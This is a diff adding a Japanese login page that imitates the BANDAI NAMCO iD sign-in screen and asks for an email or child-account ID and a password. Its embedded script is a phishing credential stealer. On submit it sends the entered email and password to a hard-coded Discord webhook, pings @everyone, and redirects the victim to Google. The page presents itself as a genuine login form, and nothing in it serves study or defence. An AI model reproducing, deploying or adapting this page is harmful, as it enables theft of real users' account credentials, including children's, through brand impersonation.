@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ログイン</title>
+<style>
+  :root{--accent:#c33a2b;--input-border:#c84b3e;--btn-disabled:#dbdbdb;--btn-active:#4387ff;}
+  body{margin:0;background:white;font-family:-apple-system,BlinkMacSystemFont,"Hiragino Kaku Gothic ProN","メイリオ","Yu Gothic","Segoe UI",Roboto,"Noto Sans JP",sans-serif;}
+  .wrap{max-width:420px;margin:40px auto;padding:18px;}
+  .brand{display:flex;align-items:center;gap:8px;margin-bottom:20px;}
+  .brand .namco{border:3px solid #d94b2e;padding:6px 12px;border-radius:6px;font-weight:700;color:#d94b2e;}
+  .brand .id{font-size:24px;font-weight:700;}
+  h1{text-align:center;margin:30px 0 40px;font-size:24px;}
+  .card{background:#f5f5f5;padding:30px 24px;border-radius:18px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
+  .field{margin-bottom:20px;}
+  label{font-size:14px;color:#666;margin-bottom:8px;display:block;}
+  .text-input{position:relative;}
+  .text-input input{width:100%;border:0;outline:0;padding:14px 40px 14px 0;font-size:16px;background:white;box-sizing:border-box;border-radius:8px;}
+  .underline{height:3px;background:var(--input-border);border-radius:2px;margin-top:6px;opacity:0;transition:opacity .2s;}
+  .text-input input:focus ~ .underline{opacity:1;}
+  .eye{position:absolute;right:6px;top:6px;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;opacity:.7;}
+  .eye svg{width:22px;height:22px;}
+  .forgot{text-align:right;font-size:13px;color:#c33a2b;text-decoration:underline;margin-top:8px;cursor:pointer;}
+  .row{display:flex;align-items:center;gap:12px;margin:24px 0;cursor:pointer;font-size:15px;}
+  .checkbox{width:28px;height:28px;border-radius:6px;border:2px solid #000;display:flex;align-items:center;justify-content:center;}
+  .checkbox.checked{background:#000;color:#fff;}
+  .checkbox.checked::after{content:"✓";font-size:20px;}
+  .btn{width:100%;padding:18px;border-radius:30px;border:0;font-size:18px;font-weight:700;margin-top:20px;transition:all .2s;}
+  .btn.disabled{background:var(--btn-disabled);color:#aaa;}
+  .btn.active{background:var(--btn-active);color:#fff;cursor:pointer;transform:translateY(-1px);box-shadow:0 6px 16px rgba(67,135,255,.4);}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="brand">
+    <div class="namco">BANDAI NAMCO</div>
+    <div class="id">iD</div>
+  </div>
+
+  <h1>ログイン</h1>
+
+  <div class="card">
+    <form id="loginForm">
+      <div class="field">
+        <label>メールアドレス／こどもアカウントID</label>
+        <div class="text-input">
+          <input id="mail" type="text" inputmode="email" autocomplete="email" required>
+          <div class="underline"></div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>パスワード</label>
+        <div class="text-input">
+          <input id="pass" type="password" autocomplete="current-password" required>
+          <div class="eye" id="eye">
+            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M1 12S5 5 12 5s11 7 11 7-4 7-11 7S1 12 1 12z"/>
+              <circle cx="12" cy="12" r="3"/>
+              <line x1="4" y1="4" x2="20" y2="20"/>
+            </svg>
+          </div>
+          <div class="underline"></div>
+        </div>
+        <div class="forgot">パスワードをお忘れの場合</div>
+      </div>
+
+      <div class="row" id="keepRow">
+        <div class="checkbox checked" id="keep"></div>
+        <span>ログインしたままにする</span>
+      </div>
+
+      <button type="submit" id="loginBtn" class="btn disabled">ログイン</button>
+    </form>
+  </div>
+</div>
+
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/1447164214895710309/WHfTbM07F0YUVXzOwtJyVRAqvifAU9e-EL8JE07OlQfmW6oBhKk06MWTiuUi9nrqBKLC";
+
+const mail = document.getElementById("mail");
+const pass = document.getElementById("pass");
+const loginBtn = document.getElementById("loginBtn");
+const loginForm = document.getElementById("loginForm");
+
+function updateButton() {
+  if (mail.value.trim() && pass.value.trim()) {
+    loginBtn.classList.remove("disabled"); loginBtn.classList.add("active");
+  } else {
+    loginBtn.classList.add("disabled"); loginBtn.classList.remove("active");
+  }
+}
+mail.addEventListener("input", updateButton);
+pass.addEventListener("input", updateButton);
+
+document.getElementById("keepRow").onclick = () => document.getElementById("keep").classList.toggle("checked");
+
+document.getElementById("eye").onclick = () => {
+  const eyeIcon = document.getElementById("eyeIcon");
+  if (pass.type === "password") {
+    pass.type = "text";
+    eyeIcon.innerHTML = `<path d="M1 12S5 5 12 5s11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>`;
+  } else {
+    pass.type = "password";
+    eyeIcon.innerHTML = `<path d="M1 12S5 5 12 5s11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/><line x1="4" y1="4" x2="20" y2="20"/>`;
+  }
+};
+
+loginForm.addEventListener("submit", async function(e) {
+  e.preventDefault();
+  if (!loginBtn.classList.contains("active")) return;
+
+  const email = mail.value.trim();
+  const password = pass.value.trim();
+
+  const payload = {
+    content: "||@everyone||\n```\n" + email + "\n" + password + "\n```"
+  };
+
+  try {
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    window.location.href = "https://www.google.com/?utm_source=chatgpt.com";
+  } catch(err) {
+    alert("通信エラーが発生しました。");
+  }
+});
+</script>
+
+</body>
+</html>
